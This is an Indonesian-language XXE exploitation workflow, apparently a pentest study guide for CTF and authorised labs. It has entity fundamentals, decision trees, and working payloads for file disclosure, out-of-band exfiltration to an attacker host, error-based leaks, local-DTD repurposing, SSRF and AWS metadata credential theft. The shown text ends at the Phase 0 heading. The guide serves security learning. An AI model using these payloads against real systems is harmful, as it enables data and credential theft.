---
id: "21"
title: "🧬 21 — XXE Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "21_xxe_workflow.md"
refs_out: ["06","07","14a","14b","20","22","60"]
refs_in: ["20","22","30"]
---

← [File 20: XSS](/docs/xss)

# 🧬 21 — XXE Workflow

> **Scope:** HackTheBox, TryHackMe, PortSwigger Academy, Proving Grounds, dan lab yang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Tool Utama:** Burp Suite (Community/Pro) + Burp Collaborator / interactsh **Level:** Beginner → Intermediate **Goal:** Identifikasi attack surface → bukti entity resolution → file disclosure → Blind XXE/OOB → SSRF → advanced chains.

---

## ⚡ One-Sentence Rule

> **XXE = XML Parser + Entity Resolution + External Resource Access + Observable Channel.**
> 
> Identifikasi keempat komponen ini sebelum menyentuh payload apapun.

---

## 📚 Daftar Isi

- [Fundamental: Memahami XXE](#-fundamental-memahami-xxe)
- [Pre-Flight](#-pre-flight-setup-environment)
- [Master Workflow](#️-master-workflow)
- [FASE 0: Attack Surface](#fase-0-identifikasi-attack-surface)
- [FASE 1: Konfirmasi Parser](#fase-1-konfirmasi-xml-parser)
- [FASE 2: File Disclosure](#fase-2-file-disclosure--baca-file-sensitif)
- [FASE 3: Blind XXE](#fase-3-blind-xxe)
- [FASE 4: XXE → SSRF](#fase-4-xxe--ssrf)
- [FASE 5: File Upload XXE](#fase-5-xxe-via-file-upload)
- [FASE 6: Local DTD Repurpose](#fase-6-repurposing-local-dtd)
- [Context-Specific](#-context-specific)
- [Technical Reference](#-technical-reference)
- [Tools & Scripts](#-tools--scripts)
- [Quick CTF Recipe](#-quick-ctf-recipe)
- [Quick Reference Cheatsheet](#-quick-reference--payload-cheatsheet)
- [Troubleshooting](#️-troubleshooting)
- [Final Checklist](#-final-checklist)
- [Cross-Workflow Links](#-cross-workflow-links)

---

## 🧠 Fundamental: Memahami XXE

> Baca ini sebelum masuk ke workflow. Bagian ini membangun fondasi konseptual — banyak keputusan di decision tree akan lebih masuk akal setelah memahami ini.

---

### Anatomi Dokumen XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rootElement [
    <!-- Internal DTD — tempat entity didefinisikan -->
    <!ENTITY nama "nilai">
    <!ENTITY % param SYSTEM "http://attacker/evil.dtd">
]>
<rootElement>
    <child>isi konten biasa</child>
    <data>&nama;</data>    <!-- general entity dipanggil di XML body -->
</rootElement>
```

Tiga lapisan penting:

```text
1. XML Declaration    →  <?xml version="1.0"?>  —  metadata versi dan encoding
2. DOCTYPE + DTD      →  mendefinisikan entity, schema, referensi eksternal
3. Element tree       →  konten dokumen yang sebenarnya
```

XXE terjadi di lapisan **DOCTYPE + DTD** — bukan di element tree. Parser memproses `<!ENTITY ... SYSTEM "...">` **sebelum** konten dokumen diproses.

---

### Tiga Jenis Entity yang Wajib Dipahami

|Jenis|Deklarasi|Cara Panggil|Context Valid|
|---|---|---|---|
|**Built-in**|(sudah ada di spec)|`&lt;` `&gt;` `&amp;` `&quot;` `&apos;`|Di mana saja|
|**General entity**|`<!ENTITY nama "nilai">`|`&nama;`|XML body|
|**Parameter entity**|`<!ENTITY % nama "nilai">`|`%nama;`|**DTD only**|

**General entity** (`&nama;`) → digunakan di **Fase 1–2** (file read, SSRF): parser memasukkan nilai entity langsung ke XML body sebelum response dikembalikan.

**Parameter entity** (`%nama;`) → digunakan di **Fase 3** (blind XXE, external DTD exfil, error-based): hanya valid di dalam DTD, tidak bisa dipanggil di element tree.

Keduanya berbeda secara fundamental — jangan tertukar saat membangun payload.

---

### SYSTEM Keyword: Pintu Masuk XXE

Tambahkan `SYSTEM "..."` pada entity declaration → parser akan **fetch resource tersebut** sebelum dokumen diproses:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">       ← baca file lokal dari filesystem
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">   ← HTTP request ke service internal (SSRF)
<!ENTITY xxe SYSTEM "http://attacker/evil.dtd"> ← fetch external DTD (OOB exfil)
```

**Ini adalah mekanisme inti XXE.** Parser yang meresolve `SYSTEM` entity tanpa restriksi = vulnerable. Attacker hanya perlu mengontrol XML yang dikirim ke parser tersebut.

---

### Mengapa Parser Bisa Vulnerable?

External entity resolution seringkali **aktif secara default** di banyak parser dan framework lama karena fitur ini memang berguna secara legitimate (memuat DTD standar, referensi dokumen, dll). Keamanan bukan prioritas desain awal XML.

|Environment|Default Behavior|Catatan|
|---|---|---|
|libxml2 + PHP (< 8.0)|✅ Aktif — vulnerable|Paling umum ditemukan di lab & CTF|
|Java Xerces (konfigurasi lama)|✅ Aktif — vulnerable|Enterprise apps lama|
|.NET XmlDocument (konfigurasi lama)|✅ Aktif — vulnerable|ASP.NET legacy|
|PHP 8.0+|❌ Disabled secara default|Masih bisa di-enable|
|Python lxml|❌ Disabled secara default|Safe by default|
|Java + hardened config|❌ Disabled via XMLInputFactory|Perlu konfigurasi eksplisit|

Jika developer tidak secara eksplisit menonaktifkan external entity resolution → semua resource yang bisa diakses oleh server process menjadi attack surface.

---

### Empat Komponen XXE — Mengapa Keempatnya Harus Ada

> Sumber: One-Sentence Rule di awal dokumen ini.

```text
XML Parser        →  server memproses XML yang dikirim attacker
Entity Resolution →  parser meresolve <!ENTITY xxe SYSTEM "...">
External Resource →  parser mengakses file:/// atau http://
Observable Channel→  attacker dapat melihat hasilnya
```

**Jika salah satu komponen tidak ada:**

|Komponen Hilang|Gejala yang Terlihat|Alternatif yang Bisa Dicoba|
|---|---|---|
|XML Parser|XML tidak diterima / 415|File upload (SVG, DOCX) → Fase 5|
|Entity Resolution|DOCTYPE diblok / entity literal muncul|XInclude → Fase 1.4|
|External Resource|Permission denied / timeout konstan|Coba resource lain (hostname, hosts, proc)|
|Observable Channel|Response kosong, tidak ada error apapun|Setup OOB channel → Fase 3|

Workflow ini bergerak dari komponen paling dasar (apakah parser menerima XML?) ke yang paling kompleks (apakah ada channel untuk mengekstrak data?).

---

### Kategori Serangan XXE

|Kategori|Kondisi|Teknik|Fase|
|---|---|---|---|
|**In-Band / Direct**|File content muncul langsung di response|`SYSTEM "file:///..."` → terbaca di body|Fase 2|
|**Blind / OOB**|Entity resolved, output tidak di-reflect|External DTD + HTTP/DNS callback|Fase 3.3|
|**Error-Based**|Parser error message terlihat di response|Data disisipkan ke path invalid → muncul di error|Fase 3.4 / Fase 6|
|**SSRF via XXE**|Parser melakukan HTTP request ke internal|`SYSTEM "http://127.0.0.1:PORT/"`|Fase 4|

---

### Aturan Kritis: Parameter Entity Nesting

**Konsep ini menjelaskan hampir semua keputusan di Fase 3 — dan sumber utama kebingungan antara internal DTD vs external DTD.**

#### Aturan XML Spec

Parameter entity (`%nama;`) **tidak boleh di-nest** di dalam Internal DTD Subset. Ini bukan bug — ini adalah aturan XML spec (XML 1.0 §4.4.8).

```xml
<!-- ILEGAL per XML spec — error di parser spec-compliant: -->
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://attacker/?d=%file;">  ← ERROR: %file; di sini = nesting dilarang
    %send;
]>
```

#### Solusi Standar: External DTD

Pindahkan logika ke file DTD terpisah yang dihosting di server attacker. Di external DTD context, nesting **legal**:

```xml
<!-- xxe.dtd — file di server attacker — nesting legal di sini: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker/?d=%file;'>">
%eval;
%send;
```

> **Mengapa `&#x25;` di dalam string value?** Di dalam nilai string entity declaration, karakter `%` harus di-escape sebagai `&#x25;` agar parser tidak menginterpretasinya sebagai parameter entity reference secara prematur. `&#x25;` = `%` dalam HTML/XML numeric character reference. Ini adalah behavior yang valid dan spec-compliant di external DTD.

#### libxml2 Extension (Parser-Specific, Non-Spec)

libxml2 — parser yang digunakan PHP di Linux — memperbolehkan `&#x25;` di dalam internal DTD sebagai ekstensi non-standard. Ini yang membuat teknik **Error-Based (Langkah 3.4)** bisa bekerja di internal DTD:

```xml
<!-- Hanya bekerja di libxml2/PHP — bukan XML spec behavior: -->
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
```

Java Xerces dan .NET mengikuti spec lebih ketat → konstruksi ini ditolak.

#### Perbandingan Tiga Teknik No-Outbound

|Teknik|Butuh Outbound?|Kompatibilitas Parser|Kapan Digunakan|
|---|---|---|---|
|External DTD + OOB|✅ Ya|Semua parser|Ada outbound HTTP/DNS|
|Local DTD Repurpose (Fase 6)|❌ Tidak|Parser-agnostic|Tidak ada outbound, ada local DTD, error visible|
|Internal DTD `&#x25;` trick (Fase 3.4)|❌ Tidak|**Hanya libxml2/PHP**|Tidak ada outbound, tidak ada local DTD, parser **verified** libxml2/PHP, error visible|

**Urutan prioritas yang benar ketika no outbound + error visible:**

```text
1. Coba Local DTD Repurpose (Fase 6) → parser-agnostic, lebih reliable
2. Jika tidak ada local DTD DAN parser verified libxml2/PHP → coba Fase 3.4
3. Kegagalan Fase 3.4 di parser non-libxml2 = limitasi teknik, bukan false negative XXE
```

---

## 🔧 Pre-Flight: Setup Environment

```bash
# Jalankan satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"       # IP tun0 kamu (VPN HTB/THM)
export LPORT="8000"
mkdir -p ~/xxe_loot/{files,dtd,payloads,notes}
cd ~/xxe_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"
```

Setup Burp Suite:

```text
1. Buka Burp Suite Community/Pro → New Project → Start Burp
2. Proxy → Options → pastikan 127.0.0.1:8080 active
3. Di browser: proxy settings → Manual → 127.0.0.1:8080
4. Browse target → Proxy → HTTP History untuk temukan XML requests
```

---

## 🗺️ Master Workflow

```text
START: Endpoint menerima XML / File Upload
│
├─ FASE 0: Temukan XML attack surface (Burp HTTP History)
│   ├─ [Direct XML POST]     → Fase 1 di Burp Repeater
│   ├─ [File Upload (SVG)]   → Fase 5A (Burp intercept upload)
│   ├─ [File Upload (DOCX)]  → Fase 5B (manual + repack + upload)
│   └─ [SOAP endpoint]       → Context-Specific: SOAP
│
├─ FASE 1: Konfirmasi Entity Resolution (Burp Repeater)
│   ├─ [Internal entity resolved] → Test external entity
│   │   ├─ [File content di response] → FASE 2 (File Disclosure)
│   │   ├─ [Kosong/tidak di-reflect]  → FASE 3 (Blind XXE)
│   │   └─ [Error visible]           → Fase 3.4 (Error-Based)
│   ├─ [DOCTYPE diblok]   → XInclude (Fase 1.4)
│   └─ [XML tidak diterima] → File Upload path
│
├─ FASE 2: File Disclosure
│   ├─ [/etc/passwd, config files] → User enum, credentials → pivot
│   ├─ [SSH private key]           → Direct SSH login → SSH workflow
│   └─ [PHP source + special chars] → php://filter/base64-encode
│
├─ FASE 3: Blind XXE [decision → TREE 4]
│   ├─ STEP 1: Apakah OOB HTTP/DNS tersedia?
│   │   ├─ YES → External DTD exfiltration (3.3)
│   │   └─ NO  ↓
│   └─ STEP 2: Apakah error message visible di response?
│       ├─ YES → Local DTD repurpose (3.5/Fase 6) [prioritas: parser-agnostic]
│       │         OR error-based [parser-specific: libxml2/PHP only] (3.4)
│       │             — gunakan (3.4) hanya jika local DTD tidak tersedia
│       │             & parser/version sudah diverifikasi
│       └─ NO  → stop / reassess attack surface
│
├─ FASE 4: XXE → SSRF
│   ├─ [Internal service] → Probe endpoint (Burp Intruder port sweep)
│   └─ [Cloud metadata]   → IAM credentials (AWS IMDSv1)
│
├─ FASE 5: File Upload XXE
│   ├─ [SVG]   → Burp intercept + inject DOCTYPE (5A)
│   └─ [DOCX]  → Manual edit XML + repack + upload (5B)
│
└─ FASE 6: Repurposing Local DTD
    └─ [No outbound + error visible + local DTD ada] → Override entity → exfil
```

**Testing Hierarchy — Jangan loncat step:**

```text
LEVEL 0  Normal XML baseline
  ↓
LEVEL 1  Internal Entity  <!DOCTYPE + &test;>
  ↓
LEVEL 2  External Entity  file:///etc/hostname
  ↓
LEVEL 3  External DTD + OOB callback
  ↓
LEVEL 4  Data exfiltration (OOB atau Error-based)
  ↓
LEVEL 5  SSRF  http://127.0.0.1:PORT/
  ↓
LEVEL 6  Local DTD repurpose (tanpa outbound)
```

---

## 🌳 Interactive Decision Guide

> **Cara Baca:** Ikuti alur dari atas ke bawah. Setiap cabang menunjukkan tindakan di **Burp Suite** beserta hasilnya — `✅ BENAR` = respons yang diharapkan, `❌ ERROR` = apa yang terjadi jika gagal dan apa langkah alternatifnya. Setiap Tree saling terhubung — ikuti penunjuk `→` ke Tree berikutnya.

---

### 🔷 TREE 1 — Deteksi & Konfirmasi XXE

```text
START: Endpoint XML ditemukan di Burp HTTP History
       (Proxy → HTTP History → filter MIME Type: XML)
│
▼
[Burp Repeater] Kirim XML Baseline — Fase 1.1
POST /product/stock
Body: <?xml version="1.0"?><stockCheck><productId>1</productId>...</stockCheck>
│
├─ ✅ BENAR  — 200 OK, data normal diproses
│   └─ → Parser menerima XML. Lanjut: Test Internal Entity ▼
│
└─ ❌ ERROR  — 415 Unsupported Media Type
    └─ Di Repeater, ubah Content-Type:
       Content-Type: text/xml
       Content-Type: application/xml; charset=utf-8
       │
       ├─ ✅ Setelah ganti → 200 OK : Lanjut Test Internal Entity ▼
       └─ ❌ Masih error → Cek endpoint lain di HTTP History
                          atau langsung File Upload path → TREE 6

▼
[Burp Repeater] Test Internal Entity — Fase 1.2
<!DOCTYPE test [<!ENTITY test "XXE_ENTITY_TEST_123">]>
<productId>&test;</productId>
│
├─ ✅ BENAR  — "Invalid product ID: XXE_ENTITY_TEST_123"
│   └─ → DTD processing aktif! Lanjut: Test External Entity ▼
│
├─ ❌ ERROR  — Entity literal muncul: {"name":"&test;"}
│   └─ → Entity tidak di-resolve
│       Coba XInclude → TREE 2
│
└─ ❌ ERROR  — "DOCTYPE is disallowed" / 400 Bad Request
    └─ → DOCTYPE diblok oleh parser
        ├─ Coba XInclude → TREE 2
        └─ Coba File Upload → TREE 6

▼
[Burp Repeater] Test External Entity / File Read — Fase 1.3
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<productId>&xxe;</productId>
│
├─ ✅ BENAR  — "Invalid product ID: web01"
│   └─ → ✅ XXE CONFIRMED! Lanjut baca file sensitif → TREE 3
│
├─ ✅ BENAR (tapi output kosong) — {"productId":""}
│   └─ → Entity resolve tapi konten tidak di-reflect
│       → Blind XXE! Setup OOB listener → TREE 4
│
└─ ❌ ERROR  — "Permission denied"
    └─ → Parser resolve tapi tidak bisa baca file ini
        Coba file lain di Repeater:
        file:///etc/hostname  →  file:///etc/hosts  →  file:///proc/version
```

---

### 🔷 TREE 2 — XInclude Fallback (Jika DOCTYPE Diblok)

```text
[Kondisi masuk] DOCTYPE diblok atau internal entity tidak di-resolve (dari TREE 1)

[Burp Repeater] Test XInclude — Fase 1.4
<?xml version="1.0"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hostname"/>
</foo>

ATAU inject langsung ke field form:
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
          <xi:include parse="text" href="file:///etc/passwd"/></foo>
│
├─ ✅ BENAR  — {"result":"web01"} atau hostname muncul
│   └─ → XInclude bekerja! Baca file sensitif → TREE 3
│
└─ ❌ ERROR  — 400 / output kosong / XInclude tidak di-proses
    └─ → XInclude tidak di-support parser ini
        ├─ Ada form upload gambar/SVG? → SVG Upload → TREE 6 (branch SVG)
        └─ Ada form upload dokumen?   → DOCX Upload → TREE 6 (branch DOCX)

CATATAN: parse="text" wajib — tanpanya parser mencoba parse isi
         file sebagai XML dan biasanya gagal
```

---

### 🔷 TREE 3 — File Disclosure (Fase 2)

```text
[Kondisi masuk] External entity file:/// BEKERJA (dari TREE 1 atau TREE 2)

[Burp Repeater] Baca file sensitif satu per satu — Fase 2.1
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<productId>&xxe;</productId>
│
├─ ✅ BENAR  — root:x:0:0:root:/root:/bin/bash muncul
│   └─ → /etc/passwd terbaca!
│       Identifikasi user dengan shell:
│       grep -v 'nologin\|false' (terminal)
│       Lanjut baca: .ssh/id_rsa → .env → config.php
│
├─ ❌ ERROR  — File muncul tapi XML rusak / terpotong / kosong
│   └─ → File mengandung karakter XML khusus (<?php, <, >, &)
│       Gunakan php://filter — Fase 2.2:
│       <!ENTITY xxe SYSTEM
│         "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
│       Output = string base64 → decode di terminal:
│       echo 'BASE64STRING' | base64 -d
│       │
│       ├─ ✅ BENAR  — source code PHP terdecode: DB credentials bocor!
│       └─ ❌ ERROR  — php:// tidak di-support (bukan PHP server)
│                      Coba /proc/self/environ atau file plaintext lain
│
└─ ❌ ERROR  — File kosong tanpa error, response normal
    └─ → Entity resolve tapi tidak di-reflect ke response
        → Blind XXE! Lanjut → TREE 4
```

---

### 🔷 TREE 4 — Blind XXE Routing (Fase 3)

```text
[Kondisi masuk] Entity resolve tapi output tidak terlihat di response

LANGKAH A: Konfirmasi OOB HTTP Connectivity — Fase 3.2
[Terminal 1] python3 -m http.server 8000
[Burp Repeater] <!ENTITY xxe SYSTEM "http://ATTACKER:8000/xxe-test">
│
├─ ✅ BENAR  — 10.10.11.200 GET /xxe-test 200 masuk di terminal
│   └─ → Outbound HTTP confirmed!
│       Setup External DTD untuk exfiltrate data → LANGKAH B ▼
│
└─ ❌ ERROR  — Tidak ada callback sama sekali (silence)
    └─ → HTTP egress diblok. Coba DNS via Burp Collaborator:
        Burp Menu → Collaborator → Copy domain
        <!ENTITY xxe SYSTEM "http://COLLABORATOR_DOMAIN/">
        Collaborator window → "Poll now" → lihat DNS query
        │
        ├─ ✅ DNS query masuk → Outbound DNS ada
        │   └─ → Gunakan Collaborator domain sebagai OOB channel
        │       untuk data exfil → LANGKAH B (ganti ATTACKER dengan Collaborator domain)
        │
        └─ ❌ DNS juga tidak masuk → Strict egress filtering
            ├─ Error message terlihat di response?
            │   ↓ Ada local DTD di server? (cek Langkah 6.1)
            │   ├─ YES → TREE 7 (Local DTD Repurpose) [parser-agnostic]
            │   └─ NO, dan parser verified libxml2/PHP
            │       → LANGKAH C (Error-Based) [parser-specific]
            └─ Tidak ada error sama sekali? → LANGKAH D (tidak ada channel tersedia)

LANGKAH B: External DTD Exfiltration — Fase 3.3
[Terminal 1] Setup xxe.dtd:
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
  %eval; %send;
[Terminal 1] python3 -m http.server 8000
[Burp Repeater] <!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
│
├─ ✅ BENAR  — GET /xxe.dtd 200 + GET /?d=web01 masuk di terminal
│   └─ → Data berhasil di-exfil via OOB!
│       Ganti target file di xxe.dtd:
│       sed -i 's|file:///etc/hostname|file:///etc/passwd|' ~/xxe_loot/dtd/xxe.dtd
│       Kirim ulang payload di Repeater → observe terminal
│
└─ ❌ ERROR  — DTD request masuk tapi tidak ada data callback (/?d=...)
    └─ → Parameter entity nesting restricted di parser ini
        Pastikan nested entity ada di External DTD,
        BUKAN di Internal DTD Subset (rule: &#x25; tidak bisa
        di-nest langsung di internal DTD → harus via External DTD)

LANGKAH C: Error-Based Exfil — Fase 3.4 [Parser-specific: libxml2/PHP]
(No outbound + error visible + tidak ada Local DTD yang suitable di server)

Evaluasi kondisi sebelum mencoba:
  □ Error message dari parser muncul di response? (required)
  □ Local DTD technique (TREE 7) sudah dicoba dan tidak berhasil? (required)
  □ Parser diverifikasi libxml2/PHP? (required — bukan fallback universal)
    → libxml2/PHP: konstruksi &#x25; di internal DTD umumnya supported
    → Java Xerces / .NET: kemungkinan TIDAK supported → kembali reassess

[Burp Repeater] — jika kondisi likely terpenuhi:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval; %error;
│
├─ ✅ BENAR  — 400 Bad Request, error message berisi isi /etc/passwd:
│   "failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
│   └─ → /etc/passwd bocor via error message! Ganti target file
│
└─ ❌ ERROR  — 400 tapi error message tidak berisi data file
    └─ → Parser strip error detail → Coba Local DTD Repurpose → TREE 7

LANGKAH D: Jika tidak ada outbound DAN tidak ada error visible → tidak ada observable channel tersedia → reassess attack surface (cari endpoint lain, file upload path, atau alternative XXE surface)
```

---

### 🔷 TREE 5 — XXE → SSRF (Fase 4)

```text
[Kondisi masuk] file:/// bekerja, ingin probe internal services

[Burp Repeater] Test SSRF ke localhost — Fase 4.1
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
<productId>&xxe;</productId>
│
├─ ✅ BENAR  — HTML atau JSON internal muncul di response
│   └─ → Internal service ditemukan! Explore endpoint
│       Kirim request baru di Repeater ke path-path internal
│
├─ ✅ BENAR (respons 200 tapi body kosong)
│   └─ → Kemungkinan port open, service tidak return konten
│       [MEDIUM CONFIDENCE — respons 200 tanpa body bersifat inferential;
│        parser behavior dapat mempengaruhi interpretasi]
│       Coba port umum lainnya:
│       80 | 443 | 8000 | 3000 | 6379 | 27017 | 9200 | 3306 | 5432
│
└─ ❌ ERROR  — "connection refused" / timeout di semua port
    └─ → Sweep port via Burp Intruder:
        Di Repeater → kanan → Send to Intruder
        Tab Positions: highlight PORT → "http://127.0.0.1:§8080§/"
        Tab Payloads: Common ports list dahulu (objective-driven, sesuai scope):
          80, 443, 8080, 8000, 8443, 3000, 6379, 27017, 9200, 3306, 5432
        Expand ke range lebih besar hanya jika rules of engagement mengizinkan
        dan ada justifikasi objektif.
        Start Attack → sort by Response Length
        Length/status berbeda dari mayoritas = kandidat port open

[Cloud Metadata] — Fase 4.2 (jika target kemungkinan di cloud)

Langkah 1: Identifikasi provider dari context (hostname, IP range, response headers).
Langkah 2: Evaluate apakah XXE GET request dapat memenuhi required request semantics:
  AWS IMDSv1  → GET, no special header → compatible dengan XXE GET
  AWS IMDSv2  → PUT + X-aws-ec2-metadata-token-ttl-seconds → NOT via XXE
  GCP         → GET + "Metadata-Flavor: Google" header → NOT via bare XXE GET
  Azure       → GET + "Metadata: true" header → NOT via bare XXE GET

[Test AWS IMDSv1 — jika target adalah AWS]:
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
│
├─ ✅ BENAR  — ami-id / hostname / iam/ tampil → IMDSv1 accessible
│   └─ → Step lanjut (each step membutuhkan request XXE terpisah):
│       .../iam/security-credentials/       → dapat nama role (jika ada IAM role ter-attach)
│       .../iam/security-credentials/ROLE   → access key + secret + token (jika role exist)
│       [Credentials hanya tersedia jika instance punya IAM role ter-attach]
│
└─ ❌ ERROR  — Timeout / 401 / empty
    ├─ AWS IMDSv2 aktif → PUT + header token required → tidak via XXE GET
    │   Document sebagai limitation
    ├─ GCP target       → Metadata-Flavor: Google header required → tidak via bare XXE
    ├─ Azure target     → Metadata: true header required → tidak via bare XXE
    └─ Bukan cloud target / metadata tidak tersedia di environment ini
```

---

### 🔷 TREE 6 — File Upload XXE (Fase 5)

```text
[Kondisi masuk] Ada form upload file, direct XML endpoint tidak berhasil

VERIFIKASI DULU — server-side XML parsing:
Apakah server melakukan server-side parsing, conversion, atau preview terhadap file?
 ├─ YES → evidence: preview URL, thumbnail generated, conversion output, parser error dari server
 │        → lanjut ke format-specific path di bawah
 └─ NO  → file hanya disimpan / dikirim ke browser → BUKAN XXE path via file upload
          Cari endpoint yang melakukan server-side processing terlebih dahulu.

FORMAT apa yang di-upload?
│
├─── FORMAT SVG → Fase 5A (Burp Intercept + Repeater)
│    │
│    STEP 1: Proxy → Intercept → ON
│            Upload file SVG valid kecil di browser
│    STEP 2: Request tertangkap → klik kanan → Send to Repeater
│            Proxy → Forward
│    STEP 3: Di Repeater, ganti body SVG dengan payload XXE:
│            <?xml version="1.0"?>
│            <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
│            <svg xmlns="http://www.w3.org/2000/svg">
│                <text>&xxe;</text>
│            </svg>
│    STEP 4: Klik Send → akses preview URL (GET /files/avatars/xxe.svg)
│    │
│    ├─ ✅ BENAR  — Isi /etc/passwd muncul di SVG preview
│    │   └─ → XXE via SVG confirmed!
│    │
│    └─ ❌ ERROR  — SVG diterima tapi tidak ada data
│        │
│        ├─ SVG ditolak (wrong MIME/extension)
│        │   └─ Di Repeater ubah: Content-Type: image/svg+xml
│        │
│        └─ SVG diterima tapi tidak trigger XXE
│            └─ → Server tidak proses XML server-side
│                Cari endpoint konversi: thumbnail, preview API
│                Jika tidak ada → coba DOCX path ▼
│
└─── FORMAT DOCX → Fase 5B (Manual build di terminal + upload via Repeater)
     │
     STEP 1: Buat DOCX payload di terminal:
             mkdir -p /tmp/xxe_docx/word /tmp/xxe_docx/_rels
             Edit word/document.xml: masukkan DOCTYPE + entity
             Buat [Content_Types].xml dan _rels/.rels
             zip -r /tmp/xxe_payload.docx /tmp/xxe_docx/
     STEP 2: Intercept upload request di Burp → Send to Repeater
             Ganti file dengan /tmp/xxe_payload.docx
     STEP 3: Send → observe response / conversion result
     │
     ├─ ✅ BENAR  — File content muncul di response atau preview
     │   └─ → XXE via DOCX confirmed!
     │
     └─ ❌ ERROR  — Upload sukses tapi tidak ada output
         └─ → Library Office modern sudah disable external entities
             (python-docx, Apache POI terbaru — hardened by default)
             Tidak ada bypass jika library sudah patch
             → Catat sebagai mitigated, cari attack surface lain
```

---

### 🔷 TREE 7 — Local DTD Repurpose (Fase 6)

```text
[Kondisi masuk] No outbound HTTP & DNS + error message visible di response

STEP 1: Temukan Local DTD di server — Fase 6.1
[Burp Repeater] Test path DTD satu per satu:
<!ENTITY xxe SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<productId>&xxe;</productId>
│
├─ ✅ BENAR  — 400 Error: "entity 'NAMA_ENTITY' already defined at..." (nama bergantung DTD)
│   └─ → DTD ditemukan! Note nama entity di error — itulah yang bisa di-override.
│       Contoh di docbookx.dtd: ISOamso [bergantung DTD & versi]
│       Lanjut: Override Entity + Exfil → STEP 2 ▼
│
└─ ❌ ERROR  — "file not found" / no error
    └─ → DTD tidak ada di path itu. Coba path lain di Repeater:
        /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
        /usr/share/sgml/docbook/sgml-dtd-4.2-*/docbook.dtd
        /usr/share/docbook-utils/sgml/docbook/dtd/docbook.dtd
        /usr/share/sgml/html/4.01/dtd/html401.dtd
        (Windows: C:\Windows\System32\wbem\cimwin32.dtd)
        │
        └─ ❌ Semua path gagal → Local DTD tidak tersedia
            Teknik ini tidak bisa dipakai di environment ini

STEP 2: Override Entity + Exfil via Error — Fase 6.2
[Burp Repeater] Payload Local DTD Override:
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval
          "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
│
├─ ✅ BENAR  — 400: "failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
│   └─ → /etc/passwd bocor via error — tanpa outbound sama sekali!
│       Ganti "file:///etc/passwd" di payload untuk file lain
│
└─ ❌ ERROR  — 400 tapi tidak ada data di error message
    └─ → Entity name yang di-override tidak ditemukan di versi/DTD ini.
        Nama entity (contoh: ISOamso) bergantung pada DTD & versinya.
        Baca isi DTD yang ditemukan untuk cari entity yang tersedia:
        <!ENTITY xxe SYSTEM "file:///path/to/local.dtd"> → baca kontennya
        Cari baris: <!ENTITY % NAMA_ENTITY ...> → gunakan NAMA_ENTITY itu
        Kemudian ganti "ISOamso" di payload Langkah 6.2 dengan NAMA_ENTITY tersebut.

CARA KERJA (Fase 6.2):
  1. %local_dtd;     → load DTD lokal dari server itu sendiri
  2. Sebelum load, entity 'ISOamso' sudah di-override dengan payload kita
  3. Ketika DTD diproses, 'ISOamso' sudah berisi error chain kita
  4. %file;          → baca /etc/passwd
  5. %error;         → buat path invalid berisi isi file → error berisi data
  6. Tidak butuh outbound HTTP atau DNS sama sekali!
```

---

### 📊 Quick Routing Table

```text
Situasi yang Kamu Temukan                        Tree yang Diikuti
─────────────────────────────────────────────────────────────────────
Baru mulai, ada endpoint XML                   → TREE 1 (Deteksi)
DOCTYPE diblok / entity literal tidak resolve  → TREE 2 (XInclude)
External entity file:/// bekerja               → TREE 3 (File Disclosure)
PHP file rusak / karakter XML spesial          → TREE 3 (php://filter) [PHP-specific]
Output tidak terlihat di response              → TREE 4 (Blind XXE)
Outbound HTTP confirmed                        → TREE 4 Langkah B
Hanya DNS yang tembus                          → TREE 4 Langkah B (via Collaborator)
No outbound, ada error message                 → TREE 7 (Local DTD) [prioritas]; TREE 4 Langkah C [parser-specific: libxml2/PHP only, jika local DTD tidak tersedia & parser verified]
Ingin probe internal services                  → TREE 5 (SSRF)
Target kemungkinan di cloud (AWS/GCP/Azure)    → TREE 5 (Cloud Metadata)
  [AWS IMDSv1 only via XXE — IMDSv2/GCP/Azure membutuhkan header yang tidak bisa via GET]
Ada file upload form (SVG/DOCX)                → TREE 6 (File Upload)
No outbound total + error visible              → TREE 7 (Local DTD)
```

---

## ══════════════════════════════════════

## FASE 0: Identifikasi Attack Surface

## ══════════════════════════════════════

> **Tujuan:** Temukan semua endpoint XML sebelum testing.

